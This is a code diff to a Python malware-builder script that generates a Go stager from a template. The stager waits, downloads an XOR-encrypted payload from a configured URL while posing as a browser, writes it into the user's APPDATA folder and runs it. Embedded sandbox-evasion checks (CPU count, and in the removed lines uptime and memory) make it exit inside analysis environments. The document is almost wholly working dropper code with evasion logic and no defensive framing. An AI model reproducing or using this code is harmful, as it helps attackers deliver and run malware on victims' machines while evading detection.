@@ -41,81 +41,60 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"os/exec"
 	"path/filepath"
-__SANDBOX_IMPORTS__	"syscall"
-	"time"
+__SANDBOX_IMPORTS__	"time"
 )
-__SANDBOX_TYPES__
-var kernel32 = syscall.NewLazyDLL("kernel32.dll")
+
+func fetch(url string) ([]byte, error) {
+	c := &http.Client{Timeout: 30 * time.Second}
+	r, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return nil, err
+	}
+	r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	resp, err := c.Do(r)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	return io.ReadAll(resp.Body)
+}
+
+func apply(data, key []byte) []byte {
+	result := make([]byte, len(data))
+	kl := len(key)
+	for i, b := range data {
+		result[i] = b ^ key[i%kl]
+	}
+	return result
+}
 
 func main() {
 __SANDBOX_CHECKS__
 	time.Sleep(__SLEEP_MS__ * time.Millisecond)
 
-	u := string([]byte{__URL_BYTES__})
-	k := []byte{__KEY_BYTES__}
-
-	c := &http.Client{Timeout: 30 * time.Second}
-	rq, _ := http.NewRequest("GET", u, nil)
-	rq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-	rs, err := c.Do(rq)
+	raw, err := fetch(string([]byte{__URL_BYTES__}))
 	if err != nil {
 		return
 	}
-	defer rs.Body.Close()
-	enc, _ := io.ReadAll(rs.Body)
 
-	dec := make([]byte, len(enc))
-	for i := range enc {
-		dec[i] = enc[i] ^ k[i%len(k)]
-	}
+	out := apply(raw, []byte{__KEY_BYTES__})
 
 	dp := filepath.Join(os.Getenv("APPDATA"), __DROP_PATH_ARGS__)
 	os.MkdirAll(filepath.Dir(dp), 0755)
-	os.WriteFile(dp, dec, 0755)
+	if os.WriteFile(dp, out, 0755) != nil {
+		return
+	}
 
-	argv, _ := syscall.UTF16PtrFromString(dp)
-	var si syscall.StartupInfo
-	var pi syscall.ProcessInformation
-	si.Flags = syscall.STARTF_USESHOWWINDOW
-	si.ShowWindow = 0
-	syscall.CreateProcess(nil, argv, nil, nil, false, 0x08000000, nil, nil, &si, &pi)
-	syscall.CloseHandle(pi.Thread)
-	syscall.CloseHandle(pi.Process)
+	exec.Command(dp).Start()
 }
 '''
 
 SANDBOX_IMPORTS = '''\t"runtime"
-\t"unsafe"
-'''
-
-SANDBOX_TYPES = '''
-type memoryStatusEx struct {
-	Length               uint32
-	MemoryLoad           uint32
-	TotalPhys            uint64
-	AvailPhys            uint64
-	TotalPageFile        uint64
-	AvailPageFile        uint64
-	TotalVirtual         uint64
-	AvailVirtual         uint64
-	AvailExtendedVirtual uint64
-}
 '''
 
 SANDBOX_CHECKS = '''\tif runtime.NumCPU() < 2 {
-\t\treturn
-\t}
-\tpGetTickCount64 := kernel32.NewProc("GetTickCount64")
-\tuptime, _, _ := pGetTickCount64.Call()
-\tif uptime < 600000 {
-\t\treturn
-\t}
-\tvar mem memoryStatusEx
-\tmem.Length = uint32(unsafe.Sizeof(mem))
-\tpGlobalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
-\tpGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&mem)))
-\tif mem.TotalPhys < 2147483648 {
 \t\treturn
 \t}
 '''
@@ -247,7 +226,6 @@ def stage_generate_stager(payload_url, xor_key, sandbox=True):
 
     source = STAGER_TEMPLATE
     source = source.replace("__SANDBOX_IMPORTS__", SANDBOX_IMPORTS if sandbox else "")
-    source = source.replace("__SANDBOX_TYPES__", SANDBOX_TYPES if sandbox else "")
     source = source.replace("__SANDBOX_CHECKS__", SANDBOX_CHECKS if sandbox else "")
     source = source.replace("__SLEEP_MS__", str(sleep_ms))
     source = source.replace("__URL_BYTES__", url_bytes)
@@ -264,7 +242,7 @@ def stage_generate_stager(payload_url, xor_key, sandbox=True):
 
     log(f"Stager generated (drop: {'/'.join(drop_subdir)}/{drop_name})", "OK")
     if sandbox:
-        log("Sandbox evasion checks embedded (CPU, uptime, RAM)", "OK")
+        log("Sandbox evasion checks embedded (CPU count)", "OK")
     return tmpdir
 
 
